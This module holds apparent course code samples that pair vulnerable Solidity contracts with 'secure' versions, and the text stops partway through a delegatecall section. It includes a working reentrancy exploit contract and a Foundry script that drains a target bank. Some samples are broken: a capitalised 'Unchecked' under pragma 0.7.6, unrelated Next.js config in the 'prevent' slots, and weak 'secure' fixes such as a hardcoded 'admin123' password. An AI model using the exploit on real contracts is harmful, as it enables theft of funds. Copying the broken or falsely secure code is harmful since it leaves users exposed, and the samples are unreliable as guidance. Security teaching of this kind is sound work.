// 4-overflow-underflow
const sample_overflowUnderflow = `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // Using old version vulnerable to overflow/underflow

/**
 * @title VulnerableToken
 * @dev A token contract vulnerable to integer overflow and underflow attacks
 * WARNING: This contract is intentionally vulnerable for educational purposes
 */
contract VulnerableToken {
    string public name = "VulnerableToken";
    string public symbol = "VULN";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    address public owner;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 value);
    
    constructor(uint256 _initialSupply) {
        owner = msg.sender;
        totalSupply = _initialSupply;
        balances[msg.sender] = _initialSupply;
    }
    
    // Vulnerable function - can overflow
    function mint(address _to, uint256 _amount) external {
      require(msg.sender == owner, "Only owner can mint");
        
      // VULNERABILITY: No overflow check!
      Unchecked {
        balances[_to] += _amount;
        totalSupply += _amount;
      }
        
      emit Mint(_to, _amount);
      emit Transfer(address(0), _to, _amount);
    }
    
    // Vulnerable function - can underflow
    function withdraw(uint256 _amount) external {
        Unchecked {
          balances[msg.sender] -= _amount;
        }

        // Send Ether (simplified for demo)
        payable(msg.sender).transfer(_amount);
        emit Transfer(msg.sender, address(0), _amount);
    }
    
    // Vulnerable transfer function
    function transfer(address _to, uint256 _amount) external {
        Unchecked {
          balances[msg.sender] -= _amount;
          balances[_to] += _amount;
        }
        
        emit Transfer(msg.sender, _to, _amount);
    }
    
    // If the version is 0.8.0 or later, this function will be safe from overflow
    function batchTransfer(address[] memory _recipients, uint256 _amount) external {
        uint256 cnt = _recipients.length;
        uint256 totalAmount = cnt * _amount;
        
        require(balances[msg.sender] >= totalAmount, "Insufficient balance");
        
        balances[msg.sender] -= totalAmount;
        for (uint256 i = 0; i < cnt; i++) {
            balances[_recipients[i]] += _amount;
            emit Transfer(msg.sender, _recipients[i], _amount);
        }
    }
    
    // Helper function to demonstrate the vulnerability
    function getBalance(address _user) external view returns (uint256) {
        return balances[_user];
    }
}`

const prevent_overflowUnderflow = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Built-in overflow protection

// For older versions, import SafeMath
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
 * @title SecureToken
 * @dev A secure token contract with overflow/underflow protection
 * Multiple protection strategies demonstrated
 */
contract SecureToken {
    // using SafeMath for uint256; // Uncomment for Solidity <0.8.0
    
    string public name = "SecureToken";
    string public symbol = "SECURE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    uint256 public constant MAX_SUPPLY = 1000000 * 10**18;
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    address public owner;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 value);
    
    constructor(uint256 _initialSupply) {
        require(_initialSupply <= MAX_SUPPLY, "Initial supply too large");
        owner = msg.sender;
        totalSupply = _initialSupply;
        balances[msg.sender] = _initialSupply;
    }
    
    // Secure mint function with overflow protection
    function mint(address _to, uint256 _amount) external {
        require(msg.sender == owner, "Only owner can mint");
        require(_to != address(0), "Cannot mint to zero address");
        
        // Protection 1: Check for overflow before operation
        require(totalSupply + _amount <= MAX_SUPPLY, "Would exceed max supply");
        require(balances[_to] + _amount >= balances[_to], "Balance overflow");
        
        // Protection 2: Solidity 0.8.0+ has built-in overflow protection
        balances[_to] += _amount;
        totalSupply += _amount;
        
        emit Mint(_to, _amount);
        emit Transfer(address(0), _to, _amount);
    }
    
    // Secure withdraw with underflow protection
    function withdraw(uint256 _amount) external {
        // Protection 1: Explicit underflow check
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        require(_amount > 0, "Amount must be positive");
        
        // Protection 2: Check contract has enough Ether
        require(address(this).balance >= _amount, "Contract insufficient funds");
        
        // Safe to subtract due to require check above
        balances[msg.sender] -= _amount;
        
        payable(msg.sender).transfer(_amount);
        emit Transfer(msg.sender, address(0), _amount);
    }
    
    // Alternative: Using unchecked blocks when overflow is intended (Solidity 0.8.0+)
    function demonstrateUnchecked(uint256 a, uint256 b) external pure returns (uint256) {
        unchecked {
            // This will wrap around instead of reverting
            return a + b;
        }
    }
    
    function getBalance(address _user) external view returns (uint256) {
        return balances[_user];
    }
}`

export const sampleOverflowUnderflow =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_overflowUnderflow,
}

export const preventOverflowUnderflow =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_overflowUnderflow,
}

// 1-starter
const sample_starter = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title BasicWallet
 * @dev A simple wallet contract demonstrating fundamental smart contract concepts
 * This contract shows basic patterns you'll encounter throughout your security journey
 */
contract BasicWallet {
    // State variables - these store data on the blockchain
    address public owner; 
    uint256 public balance;
    mapping(address => uint256) public deposits;
    
    // Events - these log important actions
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    // Constructor - runs once when contract is deployed
    constructor() {
        owner = msg.sender;
    }
    
    // Modifier - reusable code for access control
    modifier onlyOwner() { 
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // Function to receive Ether
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        deposits[msg.sender] += msg.value;
        balance += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // Function to withdraw Ether
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient balance");
        deposits[msg.sender] -= amount;
        balance -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdrawal(msg.sender, amount);
    }
    
    // Emergency function (only owner can call)
    function emergencyWithdraw() external onlyOwner {
        uint256 contractBalance = address(this).balance;
        payable(owner).transfer(contractBalance);
    }
}`

const prevent_starter = ``

export const sampleStarter =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_starter,
}

export const preventStarter =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_starter,
}

// 2-exploit-contract
const sample_exploitContract = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyExploit
 * @dev An exploit contract that demonstrates reentrancy attacks
 * This contract shows how attackers structure malicious contracts
 */

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

contract ReentrancyExploit {
    IVulnerableBank public target;
    address public attacker;
    uint256 public attackAmount;
    bool public attackInProgress;
    
    // Track stolen funds
    mapping(address => uint256) public stolenFunds;
    
    constructor(address _target) {
        target = IVulnerableBank(_target);
        attacker = msg.sender;
    }
    
    // Step 1: Initial setup and deposit
    function setupAttack() external payable {
        require(msg.sender == attacker, "Only attacker");
        require(msg.value > 0, "Need funds to attack");
        
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
    }
    
    // Step 2: Execute the reentrancy attack
    function executeAttack() external {
        require(msg.sender == attacker, "Only attacker");
        require(!attackInProgress, "Attack already running");
        
        attackInProgress = true;
        target.withdraw(attackAmount);
    }
    
    // Step 3: Reentrancy function - called by target contract
    receive() external payable {
        if (attackInProgress && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
    
    // Step 4: Extract stolen funds
    function extractFunds() external {
        require(msg.sender == attacker, "Only attacker");
        attackInProgress = false;
        
        uint256 balance = address(this).balance;
        stolenFunds[attacker] += balance;
        payable(attacker).transfer(balance);
    }
    
    // Utility functions for the attacker
    function getTargetBalance() external view returns (uint256) {
        return address(target).balance;
    }
    
    function getMyBalance() external view returns (uint256) {
        return target.getBalance(address(this));
    }
}`

const prevent_exploitContract = `import { NextRequest } from 'next/server';

export const config = {
  matcher: ['/((?!_next/|_static|_vercel|[\\w-]+\\.\\w+).*)'], // [!code highlight]

};`

export const sampleExploitContract =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_exploitContract,
}

export const preventExploitContract =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_exploitContract,
}

// 3-exploit-script
const sample_exploitScript = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title ReentrancyExploitScript
 * @dev Foundry exploit script that automates a complex reentrancy attack
 * Usage: forge script script/ReentrancyExploitScript.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
 */

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

contract AttackContract {
    IVulnerableBank public target;               // [!code highlight]
    address public attacker;
    uint256 public attackAmount;
    bool public attacking;
    
    constructor(address _target) {
        target = IVulnerableBank(_target);       // [!code highlight]
        attacker = msg.sender;
    }
    
    function attack(uint256 _amount) external {
        require(msg.sender == attacker, "Only attacker");
        attackAmount = _amount;
        attacking = true;                        // [!code highlight]
        
        // Initial deposit to establish balance
        target.deposit{value: _amount}();        // [!code highlight]
        
        // Trigger the reentrancy attack
        target.withdraw(_amount);                // [!code highlight]
    }
    
    // Reentrancy fallback function
    receive() external payable {
        if (attacking && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);       // [!code highlight]
        } else {
            attacking = false;
        }
    }
    
    function extractFunds() external {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);  // [!code highlight]
    }
}

contract ReentrancyExploitScript is Script {
    IVulnerableBank public targetBank;
    AttackContract public attackContract;
    
    address constant TARGET_BANK = 0x1234567890123456789012345678901234567890;    // [!code highlight]
    uint256 constant ATTACK_AMOUNT = 1 ether;
    
    function setUp() public {
        // Initialize target contract
        targetBank = IVulnerableBank(TARGET_BANK);       // [!code highlight]
    }
    
    function run() public {
        // Start broadcasting transactions
        vm.startBroadcast();                             // [!code highlight]
        
        console.log("=== Starting Reentrancy Exploit ===");
        console.log("Target Bank:", address(targetBank));
        console.log("Attacker:", msg.sender);
        
        // Step 1: Deploy attack contract
        console.log("Deploying attack contract...");
        attackContract = new AttackContract(address(targetBank));   // [!code highlight]
        console.log("Attack contract deployed at:", address(attackContract));
        
        // Step 2: Check initial balances
        uint256 initialBankBalance = address(targetBank).balance;
        uint256 initialAttackerBalance = msg.sender.balance;
        console.log("Initial bank balance:", initialBankBalance);
        console.log("Initial attacker balance:", initialAttackerBalance);
        
        // Step 3: Fund the attack contract
        console.log("Funding attack contract...");
        payable(address(attackContract)).transfer(ATTACK_AMOUNT);    // [!code highlight]
        
        // Step 4: Execute the attack
        console.log("Executing reentrancy attack...");
        attackContract.attack(ATTACK_AMOUNT);            // [!code highlight]
        
        // Step 5: Extract stolen funds
        console.log("Extracting stolen funds...");
        attackContract.extractFunds();                   // [!code highlight]
        
        // Step 6: Log final results
        uint256 finalBankBalance = address(targetBank).balance;
        uint256 finalAttackerBalance = msg.sender.balance;
        uint256 profit = finalAttackerBalance - initialAttackerBalance + ATTACK_AMOUNT;
        
        console.log("=== Attack Complete ===");
        console.log("Final bank balance:", finalBankBalance);
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Profit extracted:", profit);
        console.log("Attack successful:", profit > 0);
        
        // Stop broadcasting transactions
        vm.stopBroadcast();                              // [!code highlight]
    }
}`

const prevent_exploitScript = `import { NextRequest } from 'next/server';

export const config = {
  matcher: ['/((?!_next/|_static|_vercel|[\\w-]+\\.\\w+).*)'], // [!code highlight]

};`

export const sampleExploitScript =
{
  id: "sample",
  title: "Sample",
  filename: "ReentrancyExploitScript.s.sol",
  language: "solidity",
  code: sample_exploitScript,
}

export const preventExploitScript =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_exploitScript,
}

// 5-denial-of-service
const sample_denialOfService = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBank
 * @dev A simple bank contract with DoS vulnerabilities
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    address[] public users;
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        
        if (balances[msg.sender] == 0) {
            users.push(msg.sender); // [!code highlight]
        }
        
        balances[msg.sender] += msg.value;
    }
    
    // DoS Vulnerability #1: Unbounded Loop
    function distributeRewards() external {
        require(msg.sender == owner, "Only owner");
        
        // Vulnerable: As users array grows, this will hit gas limit
        for (uint i = 0; i < users.length; i++) { // [!code highlight]
            address user = users[i];
            uint256 reward = balances[user] / 100; // 1% reward
            balances[user] += reward;
        }
    }
    
    // DoS Vulnerability #2: External Call Failure
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        
        // Vulnerable: If transfer fails, entire function reverts
        payable(msg.sender).transfer(amount); // [!code highlight]
    }
    
    // DoS Vulnerability #3: Revert-based DoS
    function withdrawAll() external {
        require(msg.sender == owner, "Only owner");
        
        // Vulnerable: If any transfer fails, all users can't withdraw
        for (uint i = 0; i < users.length; i++) { // [!code highlight]
            address user = users[i];
            uint256 userBalance = balances[user];
            if (userBalance > 0) {
                balances[user] = 0;
                payable(user).transfer(userBalance); // [!code highlight]
            }
        }
    }
    
    function getUserCount() external view returns (uint256) {
        return users.length;
    }
}`

const prevent_denialOf_service = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SecureBank
 * @dev A secure bank contract with DoS prevention strategies
 */
contract SecureBank {
    mapping(address => uint256) public balances;
    mapping(address => bool) public hasWithdrawn;
    address[] public users;
    address public owner;
    bool public emergencyStop;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }
    
    modifier notEmergency() {
        require(!emergencyStop, "Emergency stop activated");
        _;
    }
    
    function deposit() external payable notEmergency {
        require(msg.value > 0, "Must deposit something");
        
        if (balances[msg.sender] == 0) {
            users.push(msg.sender);
        }
        
        balances[msg.sender] += msg.value;
    }
    
    // DoS Prevention #1: Batch Processing with Limits
    function distributeRewards(uint256 startIndex, uint256 count) external onlyOwner notEmergency { // [!code highlight]
        require(startIndex < users.length, "Invalid start index");
        
        uint256 endIndex = startIndex + count;
        if (endIndex > users.length) {
            endIndex = users.length;
        }
        
        // Process only a limited batch to avoid gas limit
        for (uint256 i = startIndex; i < endIndex; i++) { // [!code highlight]
            address user = users[i];
            uint256 reward = balances[user] / 100; // 1% reward
            balances[user] += reward;
        }
    }
    
    // DoS Prevention #2: Pull-over-Push Pattern
    function withdraw(uint256 amount) external notEmergency {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(!hasWithdrawn[msg.sender], "Already withdrawn");
        
        balances[msg.sender] -= amount;
        hasWithdrawn[msg.sender] = true;
        
        // Use call instead of transfer for better control
        (bool success, ) = payable(msg.sender).call{value: amount}(""); // [!code highlight]
        require(success, "Transfer failed");
    }
    
    // DoS Prevention #3: Individual Withdrawal
    function withdrawBalance() external notEmergency {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");
        
        balances[msg.sender] = 0;
        
        // Let users withdraw individually instead of batch processing
        (bool success, ) = payable(msg.sender).call{value: amount}(""); // [!code highlight]
        require(success, "Transfer failed");
    }
    
    // DoS Prevention #4: Circuit Breaker Pattern
    function emergencyPause() external onlyOwner {
        emergencyStop = true; // [!code highlight]
    }
    
    function emergencyResume() external onlyOwner {
        emergencyStop = false; // [!code highlight]
    }
    
    // Helper functions for batch operations
    function getUserCount() external view returns (uint256) {
        return users.length;
    }
    
    function getUser(uint256 index) external view returns (address) {
        require(index < users.length, "Index out of bounds");
        return users[index];
    }
}`

export const sampleDenialOfService =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_denialOfService,
}

export const preventDenialOfService =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_denialOf_service,
}

// 6-hash-collision
const sample_hashCollision = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableAuthenticator
 * @dev A simple authentication contract vulnerable to hash collision attacks
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableAuthenticator {
    mapping(address => bool) public authorizedUsers;
    mapping(bytes32 => bool) public usedPasswords;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        authorizedUsers[msg.sender] = true;
    }
    
    // Vulnerable: Simple password hash without salt
    function login(string memory password) external {
        // VULNERABILITY: Predictable hash generation
        bytes32 passwordHash = keccak256(abi.encodePacked(password)); // [!code highlight]
        bytes32 correctHash = keccak256(abi.encodePacked("admin123"));
        
        require(passwordHash == correctHash, "Wrong password");
        authorizedUsers[msg.sender] = true;
    }
    
    // Vulnerable: No collision detection in token verification
    function verifyToken(address user, string memory data) external view returns (bool) {
        // VULNERABILITY: Simple hash comparison without nonce
        bytes32 userHash = keccak256(abi.encodePacked(user, data)); // [!code highlight]
        bytes32 expectedHash = keccak256(abi.encodePacked(user, "valid_token"));
        
        return userHash == expectedHash;
    }
    
    // Vulnerable: Weak signature-like verification
    function authorize(address user, uint256 timestamp) external {
        require(msg.sender == owner, "Only owner");
        
        // VULNERABILITY: Predictable hash that can be easily forged
        bytes32 authHash = keccak256(abi.encodePacked(user, timestamp)); // [!code highlight]
        
        // Store hash to prevent "reuse" (but collision is still possible)
        require(!usedPasswords[authHash], "Already used");
        usedPasswords[authHash] = true;
        
        authorizedUsers[user] = true;
    }
    
    // Vulnerable: Simple access control
    function restrictedFunction() external view returns (string memory) {
        require(authorizedUsers[msg.sender], "Not authorized");
        return "Secret data accessed!";
    }
    
    // Helper function to check authorization
    function isAuthorized(address user) external view returns (bool) {
        return authorizedUsers[user];
    }
}`

const prevent_hashCollision = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SecureAuthenticator
 * @dev A secure authentication contract with hash collision prevention
 */
contract SecureAuthenticator {
    mapping(address => bool) public authorizedUsers;
    mapping(bytes32 => bool) public usedHashes;
    mapping(address => uint256) public userNonces;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        authorizedUsers[msg.sender] = true;
    }
    
    // Secure: Password hash with salt and additional entropy
    function login(string memory password, bytes32 salt) external {
        // Prevention: Use salt and chain ID for collision resistance
        bytes32 passwordHash = keccak256(abi.encodePacked(password, salt, block.chainid)); // [!code highlight]
        bytes32 correctHash = keccak256(abi.encodePacked("admin123", salt, block.chainid));
        
        require(passwordHash == correctHash, "Wrong password");
        authorizedUsers[msg.sender] = true;
    }
    
    // Secure: Token verification with nonce
    function verifyToken(address user, string memory data, uint256 nonce) external view returns (bool) {
        // Prevention: Include nonce and additional entropy
        bytes32 userHash = keccak256(abi.encodePacked(user, data, nonce, block.chainid)); // [!code highlight]
        bytes32 expectedHash = keccak256(abi.encodePacked(user, "valid_token", nonce, block.chainid));
        
        return userHash == expectedHash && userNonces[user] == nonce;
    }
    
    // Secure: Authorization with nonce and salt
    function authorize(address user, uint256 nonce, bytes32 salt) external {
        require(msg.sender == owner, "Only owner");
        require(userNonces[user] == nonce, "Invalid nonce");
        
        // Prevention: Use nonce and salt for collision resistance
        bytes32 authHash = keccak256(abi.encodePacked(user, nonce, salt, block.timestamp)); // [!code highlight]
        
        // Prevention: Check for hash collision
        require(!usedHashes[authHash], "Hash collision detected"); // [!code highlight]
        usedHashes[authHash] = true;
        
        // Prevention: Increment nonce to prevent replay
        userNonces[user]++; // [!code highlight]
        
        authorizedUsers[user] = true;
    }
    
    // Secure: Access control with proper authorization
    function restrictedFunction() external view returns (string memory) {
        require(authorizedUsers[msg.sender], "Not authorized");
        return "Secret data accessed securely!";
    }
    
    // Helper function to get current nonce
    function getCurrentNonce(address user) external view returns (uint256) {
        return userNonces[user];
    }
    
    // Helper function to generate secure salt
    function generateSecureSalt() external view returns (bytes32) {
        // Prevention: Use multiple entropy sources
        return keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            block.number,
            msg.sender
        )); // [!code highlight]
    }
    
    // Helper function to verify hash hasn't been used
    function isHashUsed(bytes32 hash) external view returns (bool) {
        return usedHashes[hash];
    }
}`

export const sampleHashCollision =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_hashCollision,
}

export const preventHashCollision =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_hashCollision,
}

// 7-price-oracle-manipulation
const sample_priceOracleManipulation = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPriceFeed {
    function getLatestPrice() external view returns (int);
}

contract PriceOracleManipulation {
    address public owner;
    IPriceFeed public priceFeed;

    constructor(address _priceFeed) {
        owner = msg.sender;
        priceFeed = IPriceFeed(_priceFeed);
    }

    function borrow(uint256 amount) public {
        int price = priceFeed.getLatestPrice();
        require(price > 0, "Price must be positive");

        // Vulnerability: No validation or protection against price manipulation
        uint256 collateralValue = uint256(price) * amount; // [!code highlight]

        // Borrow logic based on manipulated price
        // If an attacker manipulates the oracle, they could borrow more than they should
    }

    function repay(uint256 amount) public {
        // Repayment logic
    }
}`

const prevent_priceOracleManipulation = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IChainlinkPriceFeed {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 price,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract SecurePriceOracleContract {
    address public owner;
    IChainlinkPriceFeed public priceFeed;
    
    uint256 public constant PRICE_STALENESS_THRESHOLD = 3600; // 1 hour
    uint256 public constant MIN_BORROW_INTERVAL = 300; // 5 minutes
    
    mapping(address => uint256) public lastBorrowTime;
    
    constructor(address _priceFeed) {
        owner = msg.sender;
        priceFeed = IChainlinkPriceFeed(_priceFeed);
    }

    function borrow(uint256 amount) public {
        // Prevention: Add time delay between borrows
        require(
            block.timestamp >= lastBorrowTime[msg.sender] + MIN_BORROW_INTERVAL,
            "Borrow too frequent"
        ); // [!code highlight]
        
        // Prevention: Get validated price with comprehensive checks
        int256 price = getValidatedPrice(); // [!code highlight]
        require(price > 0, "Invalid price");

        uint256 collateralValue = uint256(price) * amount;
        lastBorrowTime[msg.sender] = block.timestamp;
        
        // Secure borrow logic with validated price
    }
    
    // Prevention: Comprehensive price validation
    function getValidatedPrice() internal view returns (int256) {
        (
            uint80 roundId,
            int256 price,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        
        // Prevention: Check price freshness
        require(
            block.timestamp - updatedAt <= PRICE_STALENESS_THRESHOLD,
            "Price data is stale"
        ); // [!code highlight]
        
        // Prevention: Validate round data consistency
        require(answeredInRound >= roundId, "Round data inconsistent"); // [!code highlight]
        
        // Prevention: Ensure price is positive
        require(price > 0, "Invalid price"); // [!code highlight]
        
        return price;
    }

    function repay(uint256 amount) public {
        // Secure repayment logic
    }
}`

export const samplePriceOracleManipulation =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_priceOracleManipulation,
}

export const preventPriceOracleManipulation =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_priceOracleManipulation,
}

// 8-reentrancy
const sample_reentrancy = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solidity_Reentrancy {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Vulnerability: Ether is sent before updating the user's balance, allowing reentrancy.
        (bool success, ) = msg.sender.call{value: amount}(""); // [!code highlight]
        require(success, "Transfer failed");

        // Update balance after sending Ether
        balances[msg.sender] = 0; // [!code highlight]
    }
}`

const prevent_reentrancy = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solidity_Reentrancy {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Fix: Update the user's balance before sending Ether
        balances[msg.sender] = 0; // [!code highlight]

        // Then send Ether
        (bool success, ) = msg.sender.call{value: amount}(""); // [!code highlight]
        require(success, "Transfer failed");
    }
}`

export const sampleReentrancy =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_reentrancy,
}

export const preventReentrancy =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_reentrancy,
}

// 9-block-timestamp-manipulation
const sample_blockTimestampManipulation = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableAuction
 * @dev A simple auction contract vulnerable to timestamp manipulation
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableAuction {
    address public owner;
    address public highestBidder;
    uint256 public highestBid;
    uint256 public auctionEnd;
    bool public auctionEnded;
    
    mapping(address => uint256) public pendingReturns;
    
    constructor(uint256 _auctionDuration) {
        owner = msg.sender;
        auctionEnd = block.timestamp + _auctionDuration; // [!code highlight]
    }
    
    function bid() external payable {
        // Vulnerable: Relies on block.timestamp for timing
        require(block.timestamp < auctionEnd, "Auction has ended"); // [!code highlight]
        require(msg.value > highestBid, "Bid not high enough");
        
        if (highestBidder != address(0)) {
            pendingReturns[highestBidder] += highestBid;
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
    
    function endAuction() external {
        // Vulnerable: Miners can manipulate this timing
        require(block.timestamp >= auctionEnd, "Auction not yet ended"); // [!code highlight]
        require(!auctionEnded, "Auction already ended");
        
        auctionEnded = true;
        payable(owner).transfer(highestBid);
    }
    
    // Vulnerable: Time-based random number generation
    function generateRandomWinner() external view returns (address) {
        require(auctionEnded, "Auction not ended");
        
        // Vulnerable: Predictable randomness using timestamp
        uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp))) % 3; // [!code highlight]
        
        address[3] memory participants = [owner, highestBidder, address(0x123)];
        return participants[randomIndex];
    }
    
    function withdraw() external {
        uint256 amount = pendingReturns[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        pendingReturns[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
    
    function getTimeRemaining() external view returns (uint256) {
        if (block.timestamp >= auctionEnd) {
            return 0;
        }
        return auctionEnd - block.timestamp;
    }
}`

const prevent_blockTimestampManipulation = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SecureAuction
 * @dev A secure auction contract with timestamp manipulation prevention
 */
contract SecureAuction {
    address public owner;
    address public highestBidder;
    uint256 public highestBid;
    uint256 public auctionEndBlock; // Use block numbers instead
    uint256 public auctionEndTime;
    bool public auctionEnded;
    
    mapping(address => uint256) public pendingReturns;
    
    // Use block numbers for more secure timing
    constructor(uint256 _auctionDurationBlocks) {
        owner = msg.sender;
        auctionEndBlock = block.number + _auctionDurationBlocks; // [!code highlight]
        auctionEndTime = block.timestamp + (_auctionDurationBlocks * 12); // Approximate
    }
    
    function bid() external payable {
        // Prevention: Use block numbers for critical timing
        require(block.number < auctionEndBlock, "Auction has ended"); // [!code highlight]
        require(msg.value > highestBid, "Bid not high enough");
        
        if (highestBidder != address(0)) {
            pendingReturns[highestBidder] += highestBid;
        }
        
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
    
    function endAuction() external {
        // Prevention: Use block numbers for secure timing
        require(block.number >= auctionEndBlock, "Auction not yet ended"); // [!code highlight]
        require(!auctionEnded, "Auction already ended");
        
        auctionEnded = true;
        payable(owner).transfer(highestBid);
    }
    
    // Prevention: Use external randomness source
    function generateRandomWinner(bytes32 externalRandomness) external view returns (address) {
        require(auctionEnded, "Auction not ended");
        require(externalRandomness != bytes32(0), "Invalid randomness");
        
        // Prevention: Use external randomness instead of timestamp
        uint256 randomIndex = uint256(keccak256(abi.encodePacked(
            externalRandomness,
            block.difficulty,
            block.number
        ))) % 3; // [!code highlight]
        
        address[3] memory participants = [owner, highestBidder, address(0x123)];
        return participants[randomIndex];
    }
    
    // Prevention: Time range validation
    function isValidTimeRange() external view returns (bool) {
        // Allow small variance but prevent large manipulation
        uint256 expectedTime = (auctionEndBlock - block.number) * 12;
        uint256 actualTime = auctionEndTime > block.timestamp ? 
            auctionEndTime - block.timestamp : 0;
        
        // Prevention: Detect suspicious timing
        return actualTime <= expectedTime + 300; // 5 minutes tolerance // [!code highlight]
    }
    
    function withdraw() external {
        uint256 amount = pendingReturns[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        pendingReturns[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
    
    function getBlocksRemaining() external view returns (uint256) {
        if (block.number >= auctionEndBlock) {
            return 0;
        }
        return auctionEndBlock - block.number;
    }
}`

export const sampleBlockTimestampManipulation =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_blockTimestampManipulation,
}

export const preventBlockTimestampManipulation =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_blockTimestampManipulation,
}

// 10-delegatecall-injection
const sample_delegatecallInjection = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableProxy
 * @dev A proxy contract vulnerable to delegatecall injection
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableProxy {
    address public owner;
    uint256 public balance;
    
    constructor() {
        owner = msg.sender;
    }
    
    // Vulnerable: Allows anyone to delegatecall to any address
    function execute(address target, bytes calldata data) external {
